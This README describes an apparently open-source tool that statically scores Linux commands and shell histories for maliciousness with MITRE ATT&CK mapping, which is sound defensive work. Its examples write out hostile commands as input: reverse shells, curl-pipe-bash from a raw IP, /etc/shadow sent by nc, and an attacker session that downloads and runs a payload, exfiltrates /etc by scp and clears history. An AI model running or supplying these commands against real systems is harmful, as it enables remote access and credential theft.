<h1 align="center">🦠 malscore</h1>


<p align="center">
  <a href="https://pypi.org/project/malscore/"><img src="https://img.shields.io/pypi/v/malscore.svg" alt="PyPI version"></a>
  <a href="https://pypi.org/project/malscore/"><img src="https://img.shields.io/badge/python-3.8+-blue.svg" alt="Python 3.8+"></a>
  <a href="LICENSE"><img src="https://img.shields.io/pypi/l/malscore.svg" alt="License: Apache-2.0"></a>
  <img src="https://img.shields.io/badge/dependencies-none-brightgreen.svg" alt="Zero dependencies">
  <img src="https://img.shields.io/badge/MITRE%20ATT%26CK-mapped-C5203E.svg" alt="MITRE ATT&CK mapped">
</p>

`malscore` takes a Linux command line, or a session of commands such as a shell
history, and returns a **0–100 maliciousness score** with a verdict band and
MITRE ATT&CK mapping:

```
command(s) → features → signals → score + MITRE mapping
```

It never executes, expands or resolves anything — it only reads the text
(enforced by `tests/test_safety.py`). It has no dependencies beyond the Python
standard library (3.8+).

---

## Install

```bash
pip install malscore       # provides the `malscore` command
```

From a source checkout:

```bash
pip install .              # or run without installing, from the repo root:
python3 -m malscore "<command>"
```

## Quickstart

```bash
# one command
malscore "curl -s http://45.33.2.1/x.sh | bash"

# the command from stdin
echo "nc -e /bin/sh 10.0.0.1 4444" | malscore -

# a session: one command per line, scored individually and across commands
malscore --session history.txt
history | cut -c8- | malscore --session -

# every command in a telemetry feed, high or worse only
malscore --batch events.jsonl --min-verdict high

# full evidence with MITRE technique ids
malscore "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" --explain

# machine-readable
malscore --session history.txt --json

# gate use: exit code 2 when the verdict is high or critical
malscore --session history.txt --fail-on high
```

## Python API

```python
from malscore import Analyzer

a = Analyzer()
r = a.assess_command("curl -s http://1.2.3.4/x.sh | bash")
print(r.score, r.verdict)                 # 67 high
print([h.id for h in r.hits])             # ['download_pipe_interpreter', 'raw_ip_url', ...]
print(r.techniques)                       # ['T1059.004', 'T1105', 'T1071.001']

r = a.assess_session(["curl -o /tmp/p http://1.2.3.4/p", "/tmp/p"])
print(r.score, [h.id for h in r.hits])    # 75 ['staged_download_execution', ...]
print([c.score for c in r.per_command])   # each command's own assessment
print(r.as_dict())                        # JSON-ready
```

`Analyzer(redact=True)` redacts credential-looking values before any command
text is echoed back; scores are unaffected.

---

Examples:

```
$ malscore "sudo cat /etc/shadow | nc 45.33.2.1 9001" --explain
██████████████████████░░  score  91/100  CRITICAL
  tactics: exfiltration, credential-access, command-and-control

  evidence:
    [0.60] exfiltration           Credential material is sent over the network
           T1552 T1041
    [0.55] credential-access      The password hash database (/etc/shadow) is accessed
           T1003.008
    [0.35] exfiltration           Data is sent over a raw socket
           T1048
    ...

$ cat history.txt
cd /tmp
curl -s -o /tmp/.x http://45.33.2.1/x
chmod +x /tmp/.x
/tmp/.x
tar czf /tmp/etc.tgz /etc
scp /tmp/etc.tgz loot@45.33.2.1:/srv/
history -c

$ malscore --session history.txt
████████████████████████  score  99/100  CRITICAL
  history.txt
  tactics: execution, defense-evasion, exfiltration, command-and-control, collection

  7 command(s), 6 flagged:
    ████████████░░░░░░░░░░░░ L2     49 medium   curl -s -o /tmp/.x http://45.33.2.1/x
    ███████░░░░░░░░░░░░░░░░░ L3     30 low      chmod +x /tmp/.x
    ███████░░░░░░░░░░░░░░░░░ L4     30 low      /tmp/.x
    ██████░░░░░░░░░░░░░░░░░░ L5     25 low      tar czf /tmp/etc.tgz /etc
    ████████░░░░░░░░░░░░░░░░ L6     35 medium   scp /tmp/etc.tgz loot@45.33.2.1:/srv/
    ████████████░░░░░░░░░░░░ L7     50 medium   history -c
  signals: staged_download_execution, history_cleared, collect_then_exfiltrate, upload_public_ip, multi_stage, hidden_temp_path ...
```

In a session file every non-blank line is one command, taken literally: there is
no handling of comments, line continuations or here-documents. `--batch` is
different: it scores each command of a JSON feed independently, with no
cross-command analysis.

---

## Verdict bands

| score | verdict | meaning |
| --- | --- | --- |
| 80–100 | `critical` | shape is rarely legitimate (reverse shell, disk wipe, uid‑0 account) |
| 60–79 | `high` | strong evidence; review promptly |
| 35–59 | `medium` | suspicious in most contexts (curl‑pipe‑shell, shadow read) |
| 15–34 | `low` | worth noting in combination |
| 0–14 | `benign` | routine |

The bands and weights are a hand-tuned starting point, **not** a trained model —
every point of the score traces to a named signal and a MITRE ATT&CK technique.

---

## How the score is built

1. **Features.** The command is lexed (without executing anything), wrappers
   such as `sudo`/`env`/`xargs` are unwrapped, substitutions and `-c` payloads
   are descended into, and deterministic features are computed — download
   chains, paths touched, persistence surfaces, encoding tricks, and a
   `tradecraft` group (`malscore/tradecraft.py`) that recognises specific
   attacker techniques by shape.
2. **Signals.** `malscore/signals.py` is a catalogue of ~120 named signals: a
   predicate over the feature record, a weight in `(0, 1]`, a MITRE tactic and
   technique ids. A weight reads as "how likely is this hostile if it
   were the only thing we knew". The catalogue spans, by ATT&CK tactic:
   - **execution** — interpreter from a download, decoded payloads, TTY upgrades,
     fileless execution from `/proc/self/fd`;
   - **credential access** — `/etc/shadow` and private keys, cloud metadata,
     credential-keyword searches over config files, reads of `.pgpass`/`.netrc`/
     cloud credential files, environment and history scraping, SSH-agent hijack;
   - **privilege escalation** — reverse shells, sudoers edits, setuid, container
     escape, interactive root shells, GTFOBins shell escapes, the `sudo -u#-1`
     bypass, PATH hijacks;
   - **collection / exfiltration** — archives and database dumps, access to
     tables or files holding card numbers / tokens / customer data, regex hunts
     for card numbers and SSNs, DNS and encoded exfiltration, paste/webhook
     services;
   - **defense evasion** — history and log tampering, disabling EDR/audit,
     clearing immutable flags, `/proc` bind-mount hiding;
   - **persistence / impact** — cron, systemd, login hooks, disk wipes, fork
     bombs, miners, `DROP TABLE`, mass process kills.

   The generic sensitive-data rules (card/SSN patterns, database dumps, table
   names such as `card`, `token`, `customer`) ship on by default; tune the
   `SENSITIVE_TABLE_RE` vocabulary in `malscore/tradecraft.py` for your own data.
3. **Aggregation (noisy‑OR).** Weights combine as `1 − ∏(1 − wᵢ)`, so many weak
   signals accumulate but never overflow and one strong signal dominates.
   Redundant signals that share a tactic are damped, so tripping three
   persistence checks is not counted as three independent findings.
4. **Sessions.** Each command in a session is scored as above (its
   contribution capped at 0.9, so one noisy command does not make a long session
   critical), and then **cross‑command** signals look for patterns no single
   command shows — a file downloaded early and run later, data staged (dumped,
   archived or compressed) and later `scp`‑ed away, credential access after a
   privilege escalation, an upload after credential access, staged data deleted
   once sent, download plus persistence, activity followed by history/log
   clearing, or activity spanning three or more tactics.

### Why a static score is not the whole story

A static score measures *what a command intrinsically does*. It cannot know that
`curl … | bash` is fine on a build box and an incident on a ledger database —
that is a **behavioural** judgement relative to a user/host baseline, which is
what a downstream anomaly model (e.g. an Isolation Forest over per-user
history) is for. Activity the static scorer rates low (e.g. data staging spread
across a session) is exactly what an anomaly layer exists to catch — and
session scoring recovers much of it once the commands are scored together.

The intended production shape is a hybrid:

```
                command / session
                        │
        ┌───────────────┼────────────────┐
        ▼               ▼                 ▼
   malscore        behavioural        deterministic
 (static risk)     anomaly model         rules
        └───────────────┼────────────────┘
                        ▼
                 risk / triage
```

---

## Documentation

- [docs/usage.md](docs/usage.md) — full CLI reference and the Python API
- [docs/signals.md](docs/signals.md) — every signal, its weight, tactic and techniques
- [docs/architecture.md](docs/architecture.md) — the pipeline, safety guarantee, and how to extend it
- [CHANGELOG.md](CHANGELOG.md) · [CONTRIBUTING.md](CONTRIBUTING.md)

---

## Layout

| file | role |
| --- | --- |
| `malscore/lexer.py` | non-executing shell lexer |
| `malscore/context.py` | resolves executables, payloads, paths, URLs, IPs, ports |
| `malscore/features.py` | generic feature groups (network, paths, persistence, …) |
| `malscore/tradecraft.py` | technique-specific features (reverse shells, credential hunting, …) |
| `malscore/signals.py` | weighted, MITRE-mapped signal catalogue |
| `malscore/scoring.py` | noisy-OR scoring and cross-command session analysis |
| `malscore/cli.py` | command-line interface (`malscore` / `python -m malscore`) |

---

## Extending the scorer

* **New technique detection** → add a feature to `malscore/tradecraft.py`
  (grouped by ATT&CK tactic) and return it from one of the group functions, or
  to a generic group in `malscore/features.py`.
* **New weighting** → add a `Signal` to `malscore/signals.py` with a
  weight, tactic and technique ids. No other file needs to change.

Tune weights against your own traffic before trusting the absolute numbers; the
*ranking* is more portable than the exact score.
